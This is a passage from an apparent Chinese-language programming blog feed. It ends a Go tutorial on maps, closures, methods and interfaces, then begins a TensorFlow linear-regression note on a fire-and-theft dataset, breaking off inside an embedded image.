<pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> m <span class="token operator">=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>Vertex<span class="token punctuation">{</span>
    <span class="token string">"Bell Labs"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token number">40.68433</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">74.39967</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">"Google"</span><span class="token punctuation">:</span>    <span class="token punctuation">{</span><span class="token number">37.42202</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">122.08408</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre>
<p>通过上面几段代码可以感受到， map 不算是一个函数，更像是一种类型。map 后面加 [] 之后加上返回类型，括号里的是键的类型。</p>
<p>对于 map 的插入和更新，和使用 Python 的 dict 类似。 对于访问 map ，当访问的键不存在时，默认值是0，其实在访问键时，map 会返回两个值，第一个值是键对应的值，第二个值是这个键是否在 map 中。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    m <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>

    m<span class="token punctuation">[</span><span class="token string">"Answer"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"The value:"</span><span class="token punctuation">,</span> m<span class="token punctuation">[</span><span class="token string">"Answer"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    m<span class="token punctuation">[</span><span class="token string">"Answer"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"The value:"</span><span class="token punctuation">,</span> m<span class="token punctuation">[</span><span class="token string">"Answer"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token function">delete</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token string">"Answer"</span><span class="token punctuation">)</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"The value:"</span><span class="token punctuation">,</span> m<span class="token punctuation">[</span><span class="token string">"Answer"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> m<span class="token punctuation">[</span><span class="token string">"Answer"</span><span class="token punctuation">]</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"The value:"</span><span class="token punctuation">,</span> v<span class="token punctuation">,</span> <span class="token string">"Present?"</span><span class="token punctuation">,</span> ok<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h4><p><code>Range</code> 是对于切片或者 map 的迭代。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> pow <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> pow <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"2**%d = %d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="u95ED_u5305"><a href="#u95ED_u5305" class="headerlink" title="闭包"></a>闭包</h4><p>通俗的说，闭包就是函数中包含了一些内部变量，闭包函数 return 的也是一个函数，在这个返回函数中需要用到闭包函数里存放的变量。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">adder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>
    sum <span class="token operator">:=</span> <span class="token number">0</span>
    <span class="token keyword">return</span> <span class="token keyword">func</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>
        sum <span class="token operator">+=</span> x
        <span class="token keyword">return</span> sum
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    pos<span class="token punctuation">,</span> neg <span class="token operator">:=</span> <span class="token function">adder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">adder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>
            <span class="token function">pos</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token function">neg</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>上面的这个例子就是 adder() 函数中有一个变量 sum，可以被 adder() 返回的函数所访问修改，函数外部是看不到这个 sum 变量的。 </p>
<p>比如基于闭包的斐波那契数列就可以这样写</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> a<span class="token punctuation">,</span> b <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>

    <span class="token keyword">return</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>
        ret <span class="token operator">:=</span> a
        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">+</span>b
        <span class="token keyword">return</span> ret
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    f <span class="token operator">:=</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="u65B9_u6CD5"><a href="#u65B9_u6CD5" class="headerlink" title="方法"></a>方法</h4><p>Go 是没有类这种说法的，所以可以通过在函数上指定一个接收者将一个方法与一个类型绑定。其实类似于 Python 的类函数，Python 通过 self 变量将自身的类进行传参。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"math"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> Vertex <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    X<span class="token punctuation">,</span> Y <span class="token builtin">float64</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>v Vertex<span class="token punctuation">)</span> <span class="token function">Abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">float64</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> math<span class="token punctuation">.</span><span class="token function">Sqrt</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span>X<span class="token operator">*</span>v<span class="token punctuation">.</span>X <span class="token operator">+</span> v<span class="token punctuation">.</span>Y<span class="token operator">*</span>v<span class="token punctuation">.</span>Y<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    v <span class="token operator">:=</span> Vertex<span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">Abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当然也可以在声明常规函数的时候将接收者作为参数传入以实现同样的绑定效果。方法不一定要与结构体绑定，也可以与一个变量类型绑定。</p>
<h5 id="u6307_u9488_u63A5_u6536_u8005"><a href="#u6307_u9488_u63A5_u6536_u8005" class="headerlink" title="指针接收者"></a>指针接收者</h5><p>这里有个细节，当指针作为接收者时，调用这个方法会对这个类型进行操作，而不是对这个类型的副本进行操作。另外，当变量是地址时，调用的方法的接收者为值类型是，Go 会自动解引用。</p>
<p>使用指针接收者来声明方法，可以避免每个调用方法时的拷贝值的损耗，这一点尤其在接收者是个非常大的结构体时。</p>
<h4 id="u63A5_u53E3"><a href="#u63A5_u53E3" class="headerlink" title="接口"></a>接口</h4><p>接口就是包含一组方法的标记。接口的值可以是任何实现这个方法的值。接口是隐性规定了相关类型必须要实现接口里的方法。这样做的使程序能够解耦并且很规范。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">type</span> I <span class="token keyword">interface</span> <span class="token punctuation">{</span>
    <span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">type</span> T <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    S <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// This method means type T implements the interface I,</span>
<span class="token comment" spellcheck="true">// but we don't need to explicitly declare that it does so.</span>
<span class="token keyword">func</span> <span class="token punctuation">(</span>t T<span class="token punctuation">)</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>S<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> i I <span class="token operator">=</span> T<span class="token punctuation">{</span><span class="token string">"hello"</span><span class="token punctuation">}</span>
    i<span class="token punctuation">.</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>下面这个程序重点在于方法的类型，会发现输出的类型都会以 <code>main.</code>作为前缀，比如第一个的输出是 <code>(&amp;{Hello}, *main.T)</code> ,第二个是 <code>(3.141592653589793, main.F)</code></p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"math"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> I <span class="token keyword">interface</span> <span class="token punctuation">{</span>
    <span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">type</span> T <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    S <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>t <span class="token operator">*</span>T<span class="token punctuation">)</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>S<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">type</span> F <span class="token builtin">float64</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>f F<span class="token punctuation">)</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> i I

    i <span class="token operator">=</span> <span class="token operator">&amp;</span>T<span class="token punctuation">{</span><span class="token string">"Hello"</span><span class="token punctuation">}</span>
    <span class="token function">describe</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    i<span class="token punctuation">.</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    i <span class="token operator">=</span> <span class="token function">F</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>Pi<span class="token punctuation">)</span>
    <span class="token function">describe</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    i<span class="token punctuation">.</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">describe</span><span class="token punctuation">(</span>i I<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"(%v, %T)\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>若变量的方法是 nil ，在调用接口规定的方法时，是以nil作为接收者，其值为 <nil> 。若变量本身没有值，则调用方法时会出错。</nil></p>
<p>这里有一种操作是空接口，其类型是任意类型。空接口被用来处理不知道类型的值。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> i <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token function">describe</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    i <span class="token operator">=</span> <span class="token number">42</span>
    <span class="token function">describe</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    i <span class="token operator">=</span> <span class="token string">"hello"</span>
    <span class="token function">describe</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">describe</span><span class="token punctuation">(</span>i <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"(%v, %T)\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="u53C2_u8003"><a href="#u53C2_u8003" class="headerlink" title="参考"></a>参考</h4><ol>
<li><a href="http://studygolang.com/articles/5831" target="_blank" rel="external">golang之package</a></li>
<li><a href="http://studygolang.com/topics/9" target="_blank" rel="external">Go中的switch fallthrough</a></li>
<li><a href="http://www.cnblogs.com/howDo/archive/2013/04/25/GoLang-Array-Slice.html" target="_blank" rel="external">老虞学GoLang笔记-数组和切片</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      The Go Programming Language
    
    </summary>
    
    
      <category term="go" scheme="http://xinqiu.me/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Tensorflow for Deep Learning 3</title>
    <link href="http://xinqiu.me/2017/03/06/cs20si-3/"/>
    <id>http://xinqiu.me/2017/03/06/cs20si-3/</id>
    <published>2017-03-05T16:00:00.000Z</published>
    <updated>2017-07-11T23:34:40.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>笔记3: 用 TensorFlow 实现线性回归和逻辑回归</p>
</blockquote>
<h3 id="TensorFlow__u7EBF_u6027_u56DE_u5F52"><a href="#TensorFlow__u7EBF_u6027_u56DE_u5F52" class="headerlink" title="TensorFlow 线性回归"></a>TensorFlow 线性回归</h3><p>这里介绍了一个简单的线性分类例子。</p>
<p>问：是否社区中的火灾数量与小偷存在一定的关系？换句话说，是否火灾数 X 与小偷数 Y 之前，存在 Y = f(X)?</p>
<p>这里使用 the U.S. Commission on Civil Rights 收集的数据集来分析。</p>
<p>数据集描述：</p>
<p>Name: 芝加哥火灾与小偷</p>
<p>X = 每1000个住宅单元的火灾数</p>
<p>Y = 每1000个人口中的小偷数</p>
<p>数据来源于芝加哥的不同区域，总计 42 个地区</p>
<p>答：</p>
<p>首先假设火灾数与小偷数是线性关系： Y = wX + b</p>
<p>使用均方误差作为损失函数(Loss Function)</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf
<span class="token keyword">import</span> xlrd

DATA_FILE <span class="token operator">=</span> <span class="token string">'data/fire_theft.xls'</span>

<span class="token comment" spellcheck="true"># Step 1: read in data from the .xls file</span>
<span class="token comment" spellcheck="true"># book = xlrd.open_workbook(DATA_FILE, encoding_override="utf-8")</span>
<span class="token comment" spellcheck="true"># sheet = book.sheet_by_index(0)</span>
<span class="token comment" spellcheck="true"># data = np.asarray([sheet.row_values(i) for i in range(1, sheet.nrows)])</span>
<span class="token comment" spellcheck="true"># n_samples = sheet.nrows - 1</span>
<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd  <span class="token comment" spellcheck="true"># 使用pandas更简便</span>
df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span>DATA_FILE<span class="token punctuation">)</span>
data <span class="token operator">=</span> df<span class="token punctuation">.</span>values
n_samples <span class="token operator">=</span> len<span class="token punctuation">(</span>df<span class="token punctuation">.</span>index<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 2: create placeholders for input X (number of fire) and label Y (number of theft)</span>
X <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'X'</span><span class="token punctuation">)</span>
Y <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Y'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 3: create weight and bias, initialized to 0</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'weights'</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'bias'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: build model to predict Y</span>
Y_predicted <span class="token operator">=</span> X <span class="token operator">*</span> w <span class="token operator">+</span> b 

<span class="token comment" spellcheck="true"># Step 5: use the square error as the loss function</span>
loss <span class="token operator">=</span> tf<span class="token punctuation">.</span>square<span class="token punctuation">(</span>Y <span class="token operator">-</span> Y_predicted<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'loss'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 6: using gradient descent with learning rate of 0.01 to minimize loss</span>
optimizer <span class="token operator">=</span> tf<span class="token punctuation">.</span>train<span class="token punctuation">.</span>GradientDescentOptimizer<span class="token punctuation">(</span>learning_rate<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minimize<span class="token punctuation">(</span>loss<span class="token punctuation">)</span>

<span class="token keyword">with</span> tf<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sess<span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># Step 7: initialize the necessary variables, in this case, w and b</span>
    sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global_variables_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
    writer <span class="token operator">=</span> tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span>FileWriter<span class="token punctuation">(</span><span class="token string">'./my_graph/03/linear_reg'</span><span class="token punctuation">,</span> sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># Step 8: train the model</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># train the model 100 times</span>
        total_loss <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># Session runs train_op and fetch values of loss</span>
            _<span class="token punctuation">,</span> l <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>optimizer<span class="token punctuation">,</span> loss<span class="token punctuation">]</span><span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>X<span class="token punctuation">:</span> x<span class="token punctuation">,</span> Y<span class="token punctuation">:</span>y<span class="token punctuation">}</span><span class="token punctuation">)</span>
            total_loss <span class="token operator">+=</span> l

        <span class="token keyword">print</span> <span class="token string">'Epoch {0}: {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span> total_loss<span class="token operator">/</span>n_samples<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># close the writer when you're done using it</span>
    writer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> 

    <span class="token comment" spellcheck="true"># Step 9: output the values of w and b</span>
    w_value<span class="token punctuation">,</span> b_value <span class="token operator">=</span> sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span>w<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span> 

<span class="token comment" spellcheck="true"># plot the results</span>
X<span class="token punctuation">,</span> Y <span class="token operator">=</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>T<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> <span class="token string">'bo'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'Real data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>X<span class="token punctuation">,</span> X <span class="token operator">*</span> w_value <span class="token operator">+</span> b_value<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'Predicted data'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAg0AAAFkCAYAAACjCwibAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAPYQAAD2EBqD+naQAAIABJREFUeJzt3Xt4VOW59/HvPRCFQACVk6KWKBRRPBRUykYpAgIeEC21GmtbxGotG3FjbW1fqaCIWisCVrS2tkK1jbsVK6ByUjyyAfdOtFZBWrfgATYo5wgikbnfP9YkmUkmySSZU5Lf57rmklnrmbWe5Uxm7nU/J3N3RERERGoTynQFREREpHFQ0CAiIiIJUdAgIiIiCVHQICIiIglR0CAiIiIJUdAgIiIiCVHQICIiIglR0CAiIiIJUdAgIiIiCVHQICIiIgmpc9BgZmeb2UIz22RmYTO7KE6Z3ma2wMx2mdlnZrbGzI6O2n+omc0xs21mVmJmT5pZ54ZejIiIiKROfTINbYA3gfFAlYUrzOx44FVgLTAIOBmYBuyPKjYLuAAYEylzFDC/HnURERGRNLGGLFhlZmHgYndfGLWtEDjg7t+v5jXtgE+By939b5FtvYB1wNfd/fV6V0hERERSJql9GszMCDII/zKzJWa21cxWm9noqGL9gJbAC2Ub3H098CEwIJn1ERERkeRpmeTjdQbaAjcDtwA/Bc4DnjKzwe7+KtCVIBOxp9Jrt0b2VWFmRwAjgI3ENnOIiIhIzVoB3YGl7r69IQdKdtBQlrl42t3vj/z7LTP7N+A6gr4O9TEC+FNDKyciItKMfQf4c0MOkOygYRvwJUH/hGjrgIGRf28BDjGzdpWyDV0i++LZCPD444/Tu3fv5NU2C02aNImZM2dmuhopp+tseprLteo6m5bmcJ3r1q3jyiuvhMhvaUMkNWhw91Iz+2+gV6VdXwU+iPy7iCCwGApEd4Q8FlhVzaH3A/Tu3Zu+ffsms8pZp3379k3+GkHX2RQ1l2vVdTYtzeU6IxrcvF/noMHM2gA9AItsOs7MTgV2uPtHwK+AJ8zsVeBFgj4NFwLfAHD3PWb2e+A+M9sJlAD3Ays1ckJERCR71SfTcDpBMOCRx4zI9nnAOHd/2syuA/4fMBtYD3zT3aOzCJOAg8CTwKHAEuDf63UFIiIikhZ1Dhrc/WVqGarp7nOBuTXs/wK4PvIQERGRRkBrT2SZgoKCTFchLXSdTU9zuVZdZ9PSXK4zWRo0I2S6mFlfoKioqKg5dVgRERFpsOLiYvr16wfQz92LG3KsZA+5FBHJah9++CHbtm3LdDVEkqpjx44ce+yxKT+PggYRaTY+/PBDevfuzb59+zJdFZGkys3NZd26dSkPHBQ0iEizsW3bNvbt29csJoqT5qNs8qZt27YpaBARSbbmMFGcSCpo9ISIiIgkREGDiIiIJERBg4iIiCREQYOIiIgkREGDiIgkxdy5cwmFQnz44Yf1ev3YsWPJz89Pcq0kmRQ0iIg0EfPmzSMUCpU/cnJyOProo7nqqqvYvHlzys9vZphZ7QVT8Pq77rqLBQsW1PvckhgNuRQRaULMjGnTptG9e3f279/P6tWrefTRR1m5ciVvv/02hxxySKarmBJ33nknl156KaNHj850VZo0BQ0iIjVw9wbdPWfi2CNHjiyfh2LcuHEcccQR3HPPPSxcuJBvfetbST+fNB9qnhARqaSkpISJE6eQnz+MY465mPz8YUycOIWSkpKsPnZ1zj77bNyd//3f/62yb/HixQwaNIi2bdvSrl07LrzwQtauXRtT5h//+AdXXXUVxx9/PK1bt+bII4/k6quvZseOHfWu09NPP02fPn1o3bo1p5xyCk8//XTccvfeey8DBw6kY8eO5ObmcvrppzN//vyYMqFQiH379pX3qQiFQowbNw4Ipg4fP348J5xwArm5uXTs2JFvf/vbfPDBB/Wue3OmTIOISJSSkhIGDBjDunU3Eg5PBQxw5sxZyooVY1i1aj55eXlZd+yabNiwAYDDDjssZvtjjz3G2LFjGTlyJPfccw/79u3joYce4uyzz+aNN94on5J4+fLlbNiwgXHjxtG1a1feeecdHn74YdauXcuqVavqXJ9ly5bxrW99iz59+nD33Xezfft2rrrqKo4++ugqZe+//35Gjx7NlVdeyYEDB3jiiSf49re/zTPPPMN5550HwOOPP87VV19N//79ufbaawE4/vjjAfjv//5vVq9eTUFBAUcffTQbN27kwQcf5JxzzmHt2rW0atWqzvVvLFKSyXL3rH8AfQEvKipyEZH6Kioq8tq+S66//lYPhRY7eJVHKPScT5w4pd7nT+Wx3d3nzp3roVDIV6xY4du2bfOPP/7Yn3zySe/cubPn5ub6pk2byst+9tlnfthhh/l1110Xc4xPPvnEO3To4D/84Q/Lt+3fv7/KuZ544gkPhUL+2muvVTn/Bx98UGM9TzvtNO/WrZuXlJSUb3v++efdzDw/Pz+mbOVzf/nll37yySf7sGHDYra3bdvWr7rqqirnilf3NWvWuJn5448/XmM9G4voz/W